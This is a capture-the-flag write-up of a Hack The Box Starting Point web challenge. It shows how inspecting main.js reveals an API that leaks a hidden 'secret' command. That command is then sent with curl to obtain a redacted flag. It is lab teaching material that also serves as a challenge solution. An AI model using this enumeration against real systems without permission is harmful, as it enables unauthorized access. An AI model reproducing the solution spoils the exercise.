# Hack The Box — Starting Point: Command

## Challenge Information

| Field      | Details               |
| ---------- | --------------------- |
| Platform   | Hack The Box          |
| Module     | Starting Point        |
| Challenge  | Command               |
| Category   | Web                   |
| Target     | `154.57.164.67:32185` |
| Difficulty | Starting Point        |

---

## 1. Target

The target web application was accessible at:

```text
http://154.57.164.67:32185/
```

Opening the page revealed a terminal-style game interface with commands such as:

```text
help
start
restart
sound
info
```

The application appeared to be a command-based game.

---

## 2. Web Enumeration

I opened the browser's Developer Tools and inspected the **Network** tab.

Several JavaScript files were loaded:

```text
commands.js
main.js
game.js
```

There was also a request named:

```text
options
```

This suggested that the application was communicating with backend API endpoints.

---

## 3. JavaScript Analysis

I inspected `main.js`.

The JavaScript contained the following request:

```javascript
fetch('/api/options')
```

This revealed an interesting API endpoint:

```text
/api/options
```

I queried the endpoint directly:

```bash
curl http://154.57.164.67:32185/api/options
```

The server returned:

```json
{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```

### Finding

The API response contained a suspicious `secret` entry:

```text
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

This was not displayed as a normal game option, but it was exposed through the API.

---

## 4. Discovering the Command API

Further inspection of `main.js` showed that commands were sent to:

```text
/api/monitor
```

using a POST request:

```javascript
fetch('/api/monitor', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        command: currentCommand
    })
})
```

Therefore, I could interact with the API directly instead of using only the web interface.

---

## 5. Testing the Normal Command

I first tested a normal game command:

```bash
curl -i -X POST 'http://154.57.164.67:32185/api/monitor' \
  -H 'Content-Type: application/json' \
  --data '{"command":"HEAD NORTH"}'
```

The server responded:

```text
HTTP/1.1 500 INTERNAL SERVER ERROR
```

with:

```json
{
  "message": "What are you trying to break??"
}
```

This indicated that simply following the normal game path was not necessary for retrieving the flag.

---

## 6. Testing the Exposed Secret Command

I then submitted the `secret` command discovered through `/api/options`:

```bash
curl -i -X POST 'http://154.57.164.67:32185/api/monitor' \
  -H 'Content-Type: application/json' \
  --data '{"command":"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
```

The server responded:

```text
HTTP/1.1 200 OK
```

and returned:

```json
{
  "message": "HTB{?}"
}
```

---

# 7. Flag

```text
HTB{}
```

---

## 8. Attack Path Summary

```text
Target Website
      │
      ▼
Inspect Developer Tools
      │
      ▼
Find main.js
      │
      ▼
Discover /api/options
      │
      ▼
Query /api/options
      │
      ▼
Discover "secret" command
      │
      ▼
Analyze main.js
      │
      ▼
Discover POST /api/monitor
      │
      ▼
Send secret command
      │
      ▼
Flag Retrieved
```

---

## 9. Key Takeaways

* Always inspect JavaScript files during web enumeration.
* Use browser Developer Tools to identify API endpoints.
* APIs may expose information that isn't visible in the web interface.
* Client-side functionality should never be assumed to be secure.
* Once an API endpoint is discovered, test how it behaves when accessed directly.
* `curl` is useful for reproducing and testing HTTP requests outside the browser.

### Tools Used

```text
Browser Developer Tools
curl
JavaScript source-code analysis
HTTP/API enumeration
```
